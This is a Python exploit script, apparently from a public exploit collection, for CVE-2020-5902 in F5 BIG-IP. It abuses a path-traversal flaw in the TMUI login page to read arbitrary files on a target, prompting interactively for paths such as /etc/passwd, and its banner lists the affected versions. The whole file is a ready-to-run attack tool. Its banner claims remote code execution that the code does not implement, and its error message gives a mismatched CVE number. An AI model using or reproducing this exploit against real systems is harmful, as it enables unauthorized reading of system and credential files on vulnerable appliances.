#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: zhzyker
# from: https://github.com/zhzyker/exphub
import sys
import json
import requests

def read_file(url, file):
    vuln_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=' + file
    headers = {
        'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
    }
    try:
        r = requests.get(vuln_url, headers=headers, verify=False, timeout=10)
        r1 = json.loads(r.text)
        r2 = r1["output"]
        print (r2)
    except:
        print ("[-] Target Not CVE-2020-5092 Vuln")

while 1:
    if len(sys.argv)!=2:
        print('+-------------------------------------------------------------+')
        print('+ DES: by zhzyker as https://github.com/zhzyker/exphub        +')
        print('+      CVE-2020-5902 F5 BIG-IP Read File + RCE              Â  +')
        print('+-------------------------------------------------------------+')
        print('+ USE: python3 <filename> <url>                               +')
        print('+ EXP: python3 cve-2020-5902_file.py https://1.1.1.1:8443     +')
        print('+ VER: BIG-IP 15.x: 15.1.0/15.0.0                             +')
        print('+      BIG-IP 14.x: 14.1.0 ~ 14.1.2                           +')
        print('+      BIG-IP 13.x: 13.1.0 ~ 13.1.3                           +')
        print('+      BIG-IP 12.x: 12.1.0 ~ 12.1.5                           +')
        print('+      BIG-IP 11.x: 11.6.1 ~ 11.6.5                           +')
        print('+-------------------------------------------------------------+')
        sys.exit()
    url = sys.argv[1]
    print ("[*] Examples: /etc/passwd")
    file = input("File >>> ")
    if file == "exit" : exit(0)
    read_file(url, file)
